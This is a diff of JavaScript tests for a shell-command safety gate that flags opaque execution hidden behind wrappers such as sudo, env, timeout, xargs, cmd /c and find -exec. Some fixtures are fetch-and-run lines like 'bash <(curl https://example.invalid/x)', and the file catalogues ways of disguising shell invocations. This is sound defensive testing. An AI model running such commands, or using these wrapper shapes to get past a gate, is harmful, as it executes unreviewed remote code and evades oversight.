@@ -1086,6 +1086,279 @@ t('closed grammar counterfactual: every wave 6-9 wrapper positive keeps firing u
 });
 
 // ---------------------------------------------------------------------------
+// WAVE 11 (2026-09-24, codex-recheck eleventh pass / wp-s1) -- Codex's eleventh spawned-`hook.run` verification
+// of wave 10's own head (commit 7ce9cc8), cut off by a usage limit after ~93k tokens with no report but leaving
+// a before/after probe list behind. Every positive below was dynamically verified silent on wave 10's own head
+// and firing on this fix (regressions the wave-10 grammar itself introduced, or shapes it never covered);
+// every negative was firing on wave 10's head and is now silent (false positives the closed grammar produced
+// once its OWN option-value/numeric-operand readers stopped at the first quote/escape/iteration-budget edge).
+// Named after Codex's own probe names.
+// ---------------------------------------------------------------------------
+console.log('\n2c-wave11) budget exhaustion (option + wrapper), complete-shell-word value/command reading, full timeout strtod grammar, quoted wrapper words, su/runuser/xargs/setsid-family wrappers, doas/env clustered no-value flags');
+
+t('P16-option-budget-exhausted: the option-strip loop running out of its own 8-iteration budget is unresolvable, never a leftover flag letter read as the command word', () => {
+  const cmd = 'env -u A -u A -u A -u A -u A -u A -u A -u A -u A bash -c "$x"'; // nine "-u A" pairs, budget is 8
+  assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+  assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+});
+
+t('P16-wrapper-budget-exhausted: a nested-wrapper chain deeper than statementCommandWord\'s own 12-iteration budget is unresolvable, never silently resolved to a bare leftover wrapper name', () => {
+  const deepFire = 'sudo '.repeat(15) + 'bash -c "$x"';
+  assert.strictEqual(quotes.cArgLiveAfterFlag(deepFire), true, 'not associated: ' + deepFire);
+  assert.ok(gate.classify(deepFire).matched.includes('opaque-exec'), 'classify() did not fire: ' + deepFire);
+  // distinguishing proof: the SAME depth behind a genuine non-shell program also fires only once the budget is
+  // truly exhausted (dynamic:true fires regardless of the final word) -- a shallower chain resolves normally
+  // and correctly stays silent behind a non-shell program, proving this is real exhaustion, not a shape fluke.
+  const shallowSilent = 'sudo '.repeat(11) + 'node app.js -c "$c"';
+  const deepFiresEvenNonShell = 'sudo '.repeat(12) + 'node app.js -c "$c"';
+  assert.strictEqual(quotes.cArgLiveAfterFlag(shallowSilent), false, 'within budget, must resolve normally to a non-shell "node": ' + shallowSilent);
+  assert.strictEqual(quotes.cArgLiveAfterFlag(deepFiresEvenNonShell), true, 'exhausted budget must fire even behind a non-shell program: ' + deepFiresEvenNonShell);
+});
+
+t('P16-option-value-quoted-suffix/-prefix/-escaped-space: an option value is read as ONE complete shell word, quoted and bare segments glued together with no separating whitespace', () => {
+  for (const cmd of [
+    'sudo -u "A"B bash -c "$x"', // quoted segment then a glued bare suffix
+    'sudo -u A"B" bash -c "$x"', // bare segment then a glued quoted suffix
+    'sudo --user root\\ x bash -c "$x"', // a backslash-escaped space is part of the same word
+  ]) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'the glued value must not leave a fragment looking like the leading word: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+});
+
+t('P16-timeout duration grammar: sign, hex, inf/infinity/nan, and a quoted operand are all real strtod duration forms', () => {
+  for (const cmd of [
+    'timeout +5 bash -c "$x"', // P16-timeout-plus-duration
+    'timeout 0x10 bash -c "$x"', // P16-timeout-hex-duration
+    'timeout inf bash -c "$x"', // P16-timeout-infinity-duration
+    'timeout infinity bash -c "$x"',
+    'timeout nan bash -c "$x"',
+    'timeout "5" bash -c "$x"', // P16-timeout-quoted-duration
+  ]) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+});
+
+t('P16-timeout-after-terminator: the POSIX "--" terminator ends OPTIONS, not timeout\'s own positional duration grammar', () => {
+  const cmd = 'timeout -- 5 bash -c "$x"';
+  assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+  assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  // counterfactual: a non-numeric wrapper's own "--" still returns straight to the command word, unchanged
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo -- bash -c "$x"'), true, 'sudo\'s own -- must keep working: sudo -- bash -c "$x"');
+});
+
+t('P16-wrapper-double-quoted / P16-wrapper-single-quoted: a wrapper word may itself be a complete quoted shell word', () => {
+  for (const cmd of ['"sudo" -u root bash -c "$x"', "'sudo' -u root bash -c \"$x\""]) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+  // counterfactual: an ordinary quoted PROGRAM name (not a wrapper) is unaffected by wrapper-word unquoting
+  assert.strictEqual(quotes.cArgLiveAfterFlag('"node" app.js -c "$c"'), false, 'a quoted non-wrapper program must stay silent: "node" app.js -c "$c"');
+});
+
+t('P16-sudo-host-operand: sudo\'s own "-h" is ambiguous (--help alone vs. --host <value>) once a further token follows, so it fails toward association', () => {
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo -h host bash -c "$x"'), true, 'a further token after -h must fail toward association: sudo -h host bash -c "$x"');
+  // counterfactual: a bare, trailing sudo -h (nothing else to be ambiguous with) still resolves normally
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo -h bash -c "$x"'), true, 'sudo -h bash -c "$x" must keep working via normal no-value resolution');
+});
+
+t('P16-unknown-wrapper: su/runuser (their own -c IS a shell invocation) and the newly recognised process wrappers (setsid/xargs/strace/flock/...) all associate', () => {
+  const cmds = [
+    'su -c "$x"', 'su - user -c "$x"', 'runuser -c "$x"', 'runuser -u root -c "$x"',
+    'xargs bash -c "$x"', 'echo x | xargs -I{} bash -c "$x"',
+    'setsid bash -c "$x"', 'setsid -f bash -c "$x"',
+    'strace -f bash -c "$x"', 'flock -x /tmp/lock.file bash -c "$x"',
+  ];
+  for (const cmd of cmds) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+  // documented boundary: a wrapper NOT on the recognised list at all stays a resolvable non-shell word (silent)
+  assert.strictEqual(quotes.cArgLiveAfterFlag('totally-unknown-wrapper-xyz bash -c "$x"'), false,
+    'a wrapper outside the recognised list is treated as an ordinary program: totally-unknown-wrapper-xyz bash -c "$x"');
+});
+
+// wave-11's own NAMED GAP is CLOSED this wave (SB-M3, sec-w11): flock/chroot/chrt/taskset each have a MANDATORY
+// non-option positional operand (a lockfile path/fd, a chroot NEWROOT, a priority number, a CPU mask) that is
+// now consumed unconditionally (WRAPPER_POSITIONAL_OPERAND, forge-gate-quotes.cjs) before whatever follows is
+// read as the real command word — the bare, no-option form fires too now, not only an untabled-option form.
+// flock ALSO gets su/runuser's own treatment for its OWN `-c COMMAND` mode (util-linux flock(1): runs COMMAND
+// through /bin/sh -c) once its one mandatory operand is consumed and nothing else remains. ionice is named here
+// too, but unchanged: real ionice has NO mandatory positional at all, so its bare no-option form already
+// resolved correctly before this wave and needs no fix.
+t('SB-M3: flock/chroot/chrt/taskset\'s own mandatory positional operand is now consumed, closing wave 11\'s named gap', () => {
+  const cmds = [
+    'flock /tmp/lock.file bash -c "$x"', 'flock /tmp/l -c "$x"', 'chroot /mnt bash -c "$x"',
+    'chrt 5 bash -c "$x"', 'taskset 0x1 bash -c "$x"',
+  ];
+  for (const cmd of cmds) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+  // ionice never had a mandatory operand to begin with — its bare no-option form already resolved correctly
+  assert.strictEqual(quotes.cArgLiveAfterFlag('ionice bash -c "$x"'), true, 'ionice bash -c "$x" must keep working');
+  // counterfactual: a non-shell program right after the mandatory operand still stays silent
+  assert.strictEqual(quotes.cArgLiveAfterFlag('flock /tmp/lock.file node app.js -c "$c"'), false,
+    'a non-shell program after the mandatory operand must stay silent: flock /tmp/lock.file node app.js -c "$c"');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('chroot /mnt node app.js -c "$c"'), false,
+    'a non-shell program after the mandatory operand must stay silent: chroot /mnt node app.js -c "$c"');
+});
+
+t('P16-benign-doas-no-value / P16-benign-env-flags-cluster: a completed doas no-value table and clustered short no-value flags stay silent behind a real non-shell program', () => {
+  const cmds = [
+    'doas -n node app.js -c "$c"', 'doas -L node app.js -c "$c"', 'doas -s node app.js -c "$c"',
+    'doas -Lns node app.js -c "$c"', // a genuine cluster of doas's own no-value flags
+    'env -i0 node app.js -c "$c"', 'env -vi node app.js -c "$c"',
+  ];
+  for (const cmd of cmds) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), false, 'a real non-shell command must stay silent: ' + cmd);
+    assert.deepStrictEqual(gate.classify(cmd).matched, [], 'classify() unexpectedly fired: ' + cmd);
+  }
+  // counterfactual: a cluster containing a VALUE-taking or unrecognised letter is still unresolvable (fires)
+  for (const cmd of ['sudo -iu bash -c "$x"', 'env -iZ bash -c "$x"']) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'a cluster with a non-no-value letter must fail toward association: ' + cmd);
+  }
+});
+
+t('wave 11 counterfactual: every wave 6-10 positive/negative fixture keeps behaving exactly as before', () => {
+  const positives = [
+    'sudo -u root bash -c "$x"', 'env -i bash -c "$x"', 'timeout 5 bash -c "$x"', 'nice -n 5 bash -c "$x"',
+    'doas bash -c "$x"', 'stdbuf -oL bash -c "$x"', 'sudo -- bash -c "$x"', 'sudo -p "pwd" bash -c "$x"',
+    'sudo --user root bash -c "$x"', 'sudo -r role -t type bash -c "$x"', 'timeout 5s bash -c "$x"',
+    'timeout 1e2 bash -c "$x"', 'timeout 5. bash -c "$x"', 'sudo.exe -u root bash -c "$x"',
+    'env -S "node -e 1" -c "$x"', 'sudo -h bash -c "$x"', 'sudo --help bash -c "$x"',
+    'bash `echo a; echo b` -c "$x"',
+  ];
+  for (const cmd of positives) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'a pre-existing positive must keep firing: ' + cmd);
+  }
+  const negatives = [
+    'env-runner $CONFIG -c "$x"', 'sudo-wrapper $CONFIG -c "$x"', '-foo -c "$x"',
+    'sudo -u root node report.cjs -c "$x"', 'timeout 5 wc -c "$file"', 'sh -xc "$x"', 'bash -c -- "$x"',
+  ];
+  for (const cmd of negatives) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), false, 'a pre-existing negative must stay silent: ' + cmd);
+  }
+});
+
+// ---------------------------------------------------------------------------
+// WAVE 12 (2026-09-24, codex-recheck twelfth pass / wp-t1, sec-w11) — an independent Security Boss review of
+// the wave-11 head (53abd09) found one HIGH (SB-H1) and several mediums/lows eleven Codex passes had missed.
+// SB-M3 (flock/chroot/chrt/taskset's own mandatory positional operand) already has its own test right above
+// this block, immediately after the P16-unknown-wrapper test it supersedes.
+// ---------------------------------------------------------------------------
+console.log('\n2c-wave12) SB-H1 env-assignment value, SB-M2 case-arm/brace-group attribution, SB-M4 widened wrapper/interpreter lists, SB-M5 work budget, SB-M7 process-substitution/here-string, SB-L1 unquoted wrapper word, SB-L2 sudo -h cluster/--preserve-env, SB-L3 env -S live operand');
+
+t('SB-H1 (HIGH): an env assignment\'s own value is read as a COMPLETE shell word, never stopping at its first unquoted space', () => {
+  const positives = [
+    'FOO="a b" bash -c "$x"', "FOO='a b' bash -c \"$x\"", 'FOO=a\\ b bash -c "$x"',
+    'FOO=$(cmd arg) bash -c "$x"', 'env FOO="a b" bash -c "$x"',
+  ];
+  for (const cmd of positives) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+  // counterfactual: a real non-shell program right after the (correctly, fully-read) assignment stays silent
+  assert.strictEqual(quotes.cArgLiveAfterFlag('FOO="a b" node app.js -c "$c"'), false,
+    'a non-shell program after the assignment must stay silent: FOO="a b" node app.js -c "$c"');
+  // the "eval" half of the same finding: routed through forge-gate-quotes.cjs's own stripEnvAssignment via
+  // stripCommandOpeners (forge-actiongate-position.cjs), not a smarter regex
+  assert.ok(gate.classify('FOO="a b" eval "$x"').matched.includes('opaque-exec'), 'eval half did not fire: FOO="a b" eval "$x"');
+});
+
+t('SB-M2: statement attribution survives a case-arm label and a brace-group function body', () => {
+  const positives = ['case $a in x) bash -c "$x";; esac', 'f() { bash -c "$x"; }'];
+  for (const cmd of positives) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+  const negatives = ['case $a in x) node -c "$x";; esac', 'f() { node -c "$x"; }'];
+  for (const cmd of negatives) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), false, 'a non-shell program must stay silent: ' + cmd);
+  }
+  // counterfactual: an xargs replace-string brace (data, not a group opener) must never be misread as one
+  assert.strictEqual(quotes.cArgLiveAfterFlag('echo x | xargs -I{} bash -c "$x"'), true,
+    'a data brace must not swallow the real attribution: echo x | xargs -I{} bash -c "$x"');
+});
+
+t('SB-M4: widened wrapper/interpreter lists for a beginner\'s own machine', () => {
+  const positives = [
+    'pkexec bash -c "$x"', 'winpty bash -c "$x"', 'busybox sh -c "$x"', 'fakeroot bash -c "$x"',
+    'unshare bash -c "$x"', 'nsenter bash -c "$x"', 'wsl bash -c "$x"', 'wsl -d Ubuntu bash -c "$x"',
+    'wsl -u root -- bash -c "$x"', 'fish -c "$x"', 'csh -c "$x"', 'tcsh -c "$x"', 'mksh -c "$x"', 'ash -c "$x"',
+  ];
+  for (const cmd of positives) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+  // wsl's own -e/--exec hands the rest of the line to something this file cannot re-parse as options
+  assert.strictEqual(quotes.cArgLiveAfterFlag('wsl -e bash -c "$x"'), true, 'wsl -e must be unresolvable: wsl -e bash -c "$x"');
+});
+
+t('SB-M5: a shared work budget bounds cArgLiveAfterFlag\'s total cost across many "-c" tokens to roughly linear time', () => {
+  const padded = 'bash ' + '-c x '.repeat(12000) + '-c "$x"'; // ~60 kB, many "-c" occurrences
+  const t0 = Date.now();
+  let fired;
+  assert.doesNotThrow(() => { fired = quotes.cArgLiveAfterFlag(padded); });
+  const elapsed = Date.now() - t0;
+  assert.ok(elapsed < 1000, 'cArgLiveAfterFlag() took ' + elapsed + 'ms on a 60kB "-c"-padded command, expected < 1000ms');
+  assert.strictEqual(typeof fired, 'boolean');
+  // an ordinary, small command is completely unaffected by the budget
+  assert.strictEqual(quotes.cArgLiveAfterFlag('bash -c "$x"'), true, 'an ordinary short command must still resolve normally');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('node app.js -c "$c"'), false, 'an ordinary short non-shell command must still stay silent');
+});
+
+t('SB-M7: the pipe-into-interpreter shape also fires on the non-pipe process-substitution/here-string twins of "curl | bash"', () => {
+  const positives = [
+    'bash <(curl https://example.invalid/x)', 'source <(curl https://example.invalid/x)',
+    '. <(curl https://example.invalid/x)', 'bash <<< "$CMD"', 'sh <(wget -qO- https://example.invalid/x)',
+  ];
+  for (const cmd of positives) {
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+  // counterfactual: a plain input redirection (never <( or <<<) stays silent
+  assert.deepStrictEqual(gate.classify('bash script.sh < input.txt').matched, [], 'plain "<" redirection must stay silent');
+});
+
+t('SB-L1: a wrapper/interpreter word is unquoted as a COMPLETE shell word (mixed quoted/bare/escaped segments) before matching', () => {
+  const positives = [
+    '"ba"sh -c "$x"', 's\\udo bash -c "$x"', '"C:\\Program Files\\Git\\usr\\bin\\env.exe" bash -c "$x"',
+    'C:\\tools\\timeout.exe 5 bash -c "$x"', // pre-existing bare-backslash-path fixture — must still work
+  ];
+  for (const cmd of positives) {
+    assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'not associated: ' + cmd);
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire: ' + cmd);
+  }
+  // counterfactual: an ordinary quoted non-wrapper program is unaffected
+  assert.strictEqual(quotes.cArgLiveAfterFlag('"node" app.js -c "$c"'), false, 'a quoted non-wrapper program must stay silent');
+});
+
+t('SB-L2: sudo\'s own "-h" ambiguity applies inside a CLUSTER too, and --preserve-env[=list] is a tabled optional-value long option', () => {
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo -nh host bash -c "$x"'), true, 'a clustered -h must fail toward association: sudo -nh host bash -c "$x"');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo --preserve-env bash -c "$x"'), true, 'bare --preserve-env must resolve normally: sudo --preserve-env bash -c "$x"');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo --preserve-env=PATH,HOME bash -c "$x"'), true, 'glued --preserve-env=list must resolve normally: sudo --preserve-env=PATH,HOME bash -c "$x"');
+  // counterfactual: a non-shell program right after --preserve-env=list stays silent (not an unknown-option fire)
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo --preserve-env=PATH,HOME node app.js -c "$c"'), false,
+    'a non-shell program after --preserve-env=list must stay silent');
+  // pre-existing single-letter fixtures must be unaffected
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo -h bash -c "$x"'), true, 'sudo -h bash -c "$x" must keep working');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo -h host bash -c "$x"'), true, 'sudo -h host bash -c "$x" must keep working');
+});
+
+t('SB-L3: env -S\'s own operand is unconditionally unresolvable, including when it carries a LIVE substitution', () => {
+  assert.ok(gate.classify("env -S 'sh -c ${X}' bash -c \"$x\"").matched.includes('opaque-exec'),
+    'classify() did not fire: env -S \'sh -c ${X}\' bash -c "$x"');
+});
+
+t('SB honesty: the closed-grammar false-positive cost (an untabled option on a recognised wrapper, with a live -c elsewhere)', () => {
+  const nowWarns = ['valgrind --leak-check=full ./app -c "$cfg"', 'strace -f node x -c "$c"', 'xargs -r grep -c "$pat"'];
+  for (const cmd of nowWarns) {
+    assert.ok(gate.classify(cmd).matched.includes('opaque-exec'), 'classify() did not fire (documented cost): ' + cmd);
+  }
+});
+
+// ---------------------------------------------------------------------------
 // Heredoc-claim (codex-recheck 2026-09-24, wave 8 / wp-n1) — REAL and reproduced dynamically, narrowing the
 // wave-7 "checked, NOT reproducible" claim above to exactly the context it was tested in (a heredoc NOT nested
 // inside a command substitution). Nested inside one, boundedParenEnd's own paren count used to walk INTO the
@@ -2494,6 +2767,51 @@ t('the real config declares only known except kinds', () => {
     const ex = g.match && g.match.except;
     if (ex && typeof ex === 'object') assert.ok(gate.EXCEPT_KINDS.has(ex.kind), g.id + ': unknown except kind ' + ex.kind);
   }
+});
+
+// ---------------------------------------------------------------------------
+// 2g) wp-u1 (wave 12 follow-up) — a live probe of the real hook on wave 12's own head (commit c6dff4e) found
+// two of 47 shapes not yet covered, plus a named prose gap. See forge-gate-quotes.cjs's own header for the full
+// "why" of each fix below.
+// ---------------------------------------------------------------------------
+console.log('\n2g) wp-u1 — cmd.exe /C-/K, env -S live operand, find -exec bash -c');
+
+t('wp-u1: cmd.exe\'s own /C and /K argument is read with the same live-substitution policy as -c', () => {
+  const fires = [
+    'cmd /c "$x"', 'cmd.exe /C "$x"', 'cmd /k "$x"', 'C:\\Windows\\System32\\cmd.exe /c "$x"',
+    'cmd /q /c "$x"', 'cmd /d /k "$x"', 'cmd /e:on /v:on /c "$x"', 'sudo cmd /c "$x"', '{ cmd /c "$x"; }',
+  ];
+  for (const cmd of fires) assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), true, 'must fire: ' + cmd);
+  const silent = [
+    'cmd /c "echo hi"', 'cmd /c dir', 'cmd-tool -c "$x"',
+    'cd /c/Users/YOU', 'ls /c/Users/YOU/project', // "/" is also a path character -- must not collide
+  ];
+  for (const cmd of silent) assert.strictEqual(quotes.cArgLiveAfterFlag(cmd), false, 'must stay silent: ' + cmd);
+});
+
+t('wp-u1: classify() fires opaque-exec through the full pipeline for cmd /c "$x"', () => {
+  const r = gate.classify('cmd /c "$x"');
+  assert.ok(r.matched.includes('opaque-exec'), 'classify() did not fire: ' + JSON.stringify(r.matched));
+  assert.ok(!gate.classify('cmd /c "echo hi"').matched.includes('opaque-exec'), 'a fully literal cmd /c must stay silent');
+});
+
+t('wp-u1 (SB-L3 residual): env -S\'s own operand fires on a LIVE marker inside it directly, with no later -c needed', () => {
+  assert.strictEqual(quotes.cArgLiveAfterFlag("env -S 'sh -c ${X}'"), true, 'a live ${X} inside the -S operand must fire on its own');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('env -S "sh -c ${X}"'), true, 'the same live operand double-quoted must fire too');
+  assert.strictEqual(quotes.cArgLiveAfterFlag("env -S 'sh -c \"echo hi\"'"), false, 'a fully literal -S operand must stay silent');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('sudo -S bash "$SECRET_CMD"'), false, 'sudo\'s OWN -S/--stdin must never be mistaken for env\'s -S');
+  // pre-existing wave 9/10/SB-L3 fixtures must keep working unchanged
+  assert.strictEqual(quotes.cArgLiveAfterFlag('env -S "node -e 1" -c "$x"'), true, 'pre-existing later-c mechanism must still fire');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('env --split-string="node -e 1" -c "$x"'), true, 'pre-existing later-c mechanism (long form) must still fire');
+  assert.strictEqual(quotes.cArgLiveAfterFlag("env -S 'sh -c ${X}' bash -c \"$x\""), true, 'both mechanisms firing on the same statement must not regress each other');
+  assert.ok(gate.classify("env -S 'sh -c ${X}'").matched.includes('opaque-exec'), 'classify() did not fire through the full pipeline');
+});
+
+t('wp-u1: GNU find\'s own -exec/-execdir clause is a recognised statement boundary, closing the named prose gap', () => {
+  assert.strictEqual(quotes.cArgLiveAfterFlag('find . -exec bash -c "$x" \\;'), true, 'must resolve past -exec to "bash"');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('find . -execdir bash -c "$x" \\;'), true, '-execdir must resolve the same way');
+  assert.strictEqual(quotes.cArgLiveAfterFlag('find . -exec echo hi \\;'), false, 'a non-shell -exec target must stay silent');
+  assert.ok(gate.classify('find . -exec bash -c "$x" \\;').matched.includes('opaque-exec'), 'classify() did not fire through the full pipeline');
 });
 
 // ---------------------------------------------------------------------------
